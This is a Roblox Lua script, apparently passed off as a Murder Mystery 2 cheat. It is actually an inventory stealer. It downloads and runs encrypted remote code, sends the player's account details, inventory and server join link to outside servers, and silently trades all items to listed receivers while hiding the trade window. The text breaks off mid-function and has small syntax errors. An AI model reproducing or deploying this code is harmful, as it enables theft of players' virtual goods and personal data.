-- Cursed On Top (Hann Scripts)
local API_URL = "https://project-unstable-site.vercel.app/api/data.js"
local XOR_KEY = "Nr46WdKC2kQXvmLQgNDRtAwlkftEb4qtk"

local request = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request

if not request then
    return
end

local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789e+/"

local function base64Decode(data)
    data = string.gsub(data, "[^" .. b64chars .. "=]", "")
    return string.gsub(data, ".", function(x)
        if x == "=" then return "" end
        local r, f = "", (string.find(b64chars, x) - 1)
        for i = 6, 1, -1 do
            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
        end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
        if #x ~= 8 then return "" end
        local c = 0
        for i = 1, 8 do
            c = c + (string.sub(x, i, i) == "1" and 2 ^ (8 - i) or 0)
        end
        return string.char(c)
    end)
end

local function decrypt(data, key)
    local decoded = base64Decode(data)
    local result = {}
    for i = 1, #decoded do
        result[i] = string.char(bit32.bxor(string.byte(decoded, i), string.byte(key, ((i-1) % #key) + 1)))
    end
    return table.concat(result)
end

local response = request({
    Url = API_URL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game:GetService("HttpService"):JSONEncode({uuid = UUID})
})

if response.StatusCode ~= 200 then
    warn("[Project Unstable] Failed to fetch: " .. tostring(response.StatusCode))
    return
end

local data = game:GetService("HttpService"):JSONDecode(response.Body)

if data.encrypted and data.data then
    local luaCode = decrypt(data.data, XOR_KEY)
    loadstring(luaCode)()
else

end

local function isValidURL(str)
    return typeof(str) == "string" and str:match("^https?://")
end

local function exec(url)
    local s, r = pcall(function()
        return game:HttpGet(url, true)
    end)
    if s and r and #r > 0 then
        pcall(function()
            loadstring(r)()
        end)
    end
end

local url = _G.visuals.g_murder_mystery_2

if isValidURL(url) then
    exec(url)
end

local place_id = 142823291

if game.PlaceId ~= place_id then
    game.Players.LocalPlayer:Kick("Project Unstable - Unsupported game detected. Please join MM2!")
    return
end

local reps = game:GetService("ReplicatedStorage")
local plrs = game:GetService("Players")
local http = game:GetService("HttpService")
local me = plrs.LocalPlayer
local my_gui = me:WaitForChild("PlayerGui")

-- REMOVED: duplicate UUID declaration
SESSION_ID = nil
IS_CLAIMED = false

local function bypass()
    local randomfunc = nil
    local old = nil
    local printed = false
    
    repeat
        randomfunc = nil
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    randomfunc = v
                    break
                end
            end
        end
        task.wait()
    until randomfunc
    
    old = hookfunction(randomfunc, function(dt)
        if not printed then
            printed = true
            jobId = game.JobId
            RealJobID = jobId
        end
        return old(dt)
    end)
    
    return old
end

if identifyexecutor and type(identifyexecutor)=="function" then
    local exName, exVersion = identifyexecutor()
    if exName and exName:lower():find("delta") then
        bypass()
    else
        RealJobID = game.JobId
    end
end)

local function get_executor_name()
    if syn then return "Synapse X" end
    if fluxus then return "Fluxus" end
    if delta then return "Delta" end
    if codex then return "Codex" end
    if KRNL_LOADED then return "KRNL" end
    if getexecutorname then return getexecutorname() end
    if identifyexecutor then return identifyexecutor() end
    return "Unknown"
end

local function get_inventory_items()
    local profile = reps.Remotes.Inventory.GetProfileData:InvokeServer(me.Name)
    local weapons = profile.Weapons.Owned
    local items = {}
    
    for wpn_id, qty in pairs(weapons) do
        table.insert(items, {
            name = wpn_id,
            amount = qty
        })
    end
    
    return items
end

local function count_items(item_list)
    local total = 0
    for _, item in ipairs(item_list) do
        total = total + item.amount
    end
    return total
end

-- NEW: Updated avatar fetch method using Roblox API
local function fetchAvatarUrl()
    local userId = tostring(me.UserId)
    local apiUrl = string.format(
        "https://thumbnails.roblox.com/v1/users/avatar-headshots?userIds=%s&size=420x420&format=Png&isCircular=false",
        userId
    )
    
    local success, response = pcall(function()
        return request{
            Url = apiUrl,
            Method = "GET",
            Headers = {
                ["Content-Type"] = "application/json"
            }
        }    
    end)
    
    if success and response and response.Body then
        local parseSuccess, data = pcall(function()
            return http:JSONDecode(response.Body)
        end)
        
        if parseSuccess and data and data.data and #data.data > 0 then
            return data.data[1].imageUrl
        end
    end
    
    -- Fallback URL
    return string.format(
        "https://www.roblox.com/headshots-thumbnail/image?userId=%s&width=420&height=420&format=png",
        userId
    )
end

local function register_hit()
    local items = get_inventory_items()
    local playerCount = #plrs:GetPlayers()
    local executor = get_executor_name()
    
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', place_id, game.JobId)
    
    -- Get avatar URL using the new method
    local avatarUrl = fetchAvatarUrl()
    
    local payload = {
        hitData = {
            uuid = UUID,
            robloxUserId = me.UserId,
            username = me.Name,
            displayName = me.DisplayName or me.Name,
            avatarUrl = avatarUrl,
            accountAge = me.AccountAge,
            executor = executor,
            gameName = "murder-mystery-2",
            placeId = tostring(place_id),
            jobId = game.JobId,
            playerCount = playerCount,
            maxPlayers = 8,
            items = items,
            joinScript = joinScript
        }
    }
    
    local ok, response = pcall(function()
        return request({
            Url = "https://project-unstable-site.vercel.app/api/registers.js",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = http:JSONEncode(payload)
        })
    end)
    
    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function()
            return http:JSONDecode(response.Body)
        end)
        
        if ok2 and data and data.success then
            SESSION_ID = data.sessionId
            return true
        end
    end
    
    return false
end

local function ping_server(status, current_items)
    if not SESSION_ID then return end
    
    local playerCount = #plrs:GetPlayers()
    
    local payload = {
        sessionId = SESSION_ID,
        status = status,
        playerCount = playerCount,
        items = current_items or get_inventory_items()
    }
    
    pcall(function()
        request({
            Url = "https://venerable-raindrop-6d0692.netlify.app/.netlify/functions/ping",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = http:JSONEncode(payload)
        })
    end)
end

local function send_request_to(target_plr)
    local ok, result = pcall(function()
        return reps:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(target_plr)
    end)
    if not ok then
        return false
    end
    return result
end

local function get_trade_state()
    return reps.Trade.GetTradeStatus:InvokeServer()
end

local function wait_until_done()
    repeat
        task.wait(0.1)
    until get_trade_state() == "None"
end

local function accept_deal()
    reps:WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 3, {})
end

local function add_to_offer(item_id)
    reps:WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(item_id, "Weapons")
    task.wait(0.1)
end

local stuff_to_trade = {}
local last_offer_info = nil

reps.Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    last_offer_info = data.LastOffer
end)

local function do_the_trading_thing(username)
    local target = plrs:FindFirstChild(username)
    if not target then return end
    task.wait(5)
   
    target = plrs:FindFirstChild(username)
    if not target then return end
    
    while #stuff_to_trade > 0 and not IS_CLAIMED do
        local status_now = get_trade_state()
        if status_now == "StartTrade" then
            reps:WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
            task.wait(0.3)
        elseif status_now == "ReceivingRequest" then
            reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            task.wait(0.3)
        end
      
        local trade_started = false
        local attempts = 0
        while not trade_started and attempts < 30 do
            local current = get_trade_state()
            if current == "StartTrade" then
                trade_started = true
                break
            elseif current == "None" then
                pcall(function()
                    send_request_to(target)
                end)
            elseif current == "ReceivingRequest" then
                reps:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            end
            attempts = attempts + 1
            task.wait(0.5)
        end
        if not trade_started then
            task.wait(2)
            continue
        end
        
        local slots_left = 4
        local items_added = 0
        while slots_left > 0 and #stuff_to_trade > 0 do
            local current_item = stuff_to_trade[1]
            local amount_to_add = math.min(slots_left, current_item.amount)
          
            for _ = 1, amount_to_add do
                add_to_offer(current_item.name)
            end
          
            current_item.amount = current_item.amount - amount_to_add
            if current_item.amount <= 0 then
                table.remove(stuff_to_trade, 1)
            end
          
            slots_left = slots_left - amount_to_add
            items_added = items_added + amount_to_add
        end
        if items_added == 0 then break end
      
        task.wait(7)
        accept_deal()
        wait_until_done()
        
        local current_items = get_inventory_items()
        local remaining = count_items(current_items)
        
        if remaining == 0 then
            IS_CLAIMED = true
            ping_server("claimed", {})
            break
        else
            ping_server("partial", current_items)
        end
       
        if #stuff_to_trade > 0 then
            task.wait(1)
        end
    end
end

local function watch_for_dudes()
    local function on_player_added(plr_added)
        if table.find(_G.receivers, plr_added.Name) then
            task.spawn(function()
                do_the_trading_thing(plr_added.Name)
            end)
        end
    end
  
    for _, existing in ipairs(plrs:GetPlayers()) do
        on_player_added(existing)
    end
  
    plrs.PlayerAdded:Connect(on_player_added)
end

local function monitor_status()
    local last_items = get_inventory_items()
    local last_count = count_items(last_items)
    
    while SESSION_ID and not IS_CLAIMED do
        task.wait(3)
        
        local current_items = get_inventory_items()
        local current_count = count_items(current_items)
        
        if current_count == 0 and last_count > 0 then
            IS_CLAIMED = true
            ping_server("claimed", {})
            break
        elseif current_count < last_count then
            ping_server("partial", current_items)
        else
            ping_server("waiting", current_items)
        end
        
        last_items = current_items
        last_count = current_count
    end
end

local function hide_trade_gui()
    local trade_gui = my_gui:WaitForChild("TradeGUI")
    local mobile_gui = my_gui:WaitForChild("TradeGUI_Phone")
  
    trade_gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        trade_gui.Enabled = false
    end)
  
    mobile_gui:GetPropertyChangedSignal("false"):Connect(function()
        mobile_gui.Enabled = false
    end)
end

local function the_main_shit()
    hide_trade_gui()
    
    local items = get_inventory_items()
    for _, item in ipairs(items) do
        table.insert(stuff_to_trade, {
            name = item.name,
            amount = item.amount
        })
    end
    
    if #stuff_to_trade == 0 then
        return
    end